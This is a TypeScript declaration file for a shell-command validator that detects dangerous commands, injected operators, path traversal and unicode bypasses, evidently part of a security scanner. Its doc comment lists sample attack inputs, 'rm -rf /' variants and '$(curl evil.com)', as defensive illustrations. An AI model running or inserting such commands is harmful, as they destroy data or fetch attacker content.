export interface CommandThreat {
    type: 'dangerous-command' | 'operator-injection' | 'path-traversal' | 'unicode-bypass';
    severity: 'critical' | 'high' | 'medium';
    detail: string;
    token: string;
}
export interface CommandValidationResult {
    safe: boolean;
    threats: CommandThreat[];
}
export interface CommandWarning {
    type: 'dangerous-command' | 'operator-injection' | 'path-traversal' | 'unicode-bypass';
    severity: 'critical' | 'high' | 'medium';
    message: string;
    token: string;
}
/**
 * True AST-based analysis using shell-quote tokenizer.
 * shell-quote correctly handles quoting, escaping, and expansions.
 *
 * Why this is better than regex:
 *   - "r\u006d -rf /" → regex misses it; shell-quote normalizes to ["rm", "-rf", "/"]
 *   - "foo; rm -rf /" → regex might miss if pattern is anchored; AST sees the semicolon node
 *   - "$(curl evil.com)" → regex hits pattern in string; AST surfaces the $ substitution operator
 */
export declare function validateCommand(command: string, args?: string[]): CommandValidationResult;
/**
 * CommandValidator class — maintains backward-compatible interface
 * with existing security-scanner.ts consumers.
 */
export declare class CommandValidator {
    validate(serverConfig: {
        command?: string;
        args?: string[];
    }): CommandWarning[];
}
//# sourceMappingURL=command-validator.d.ts.map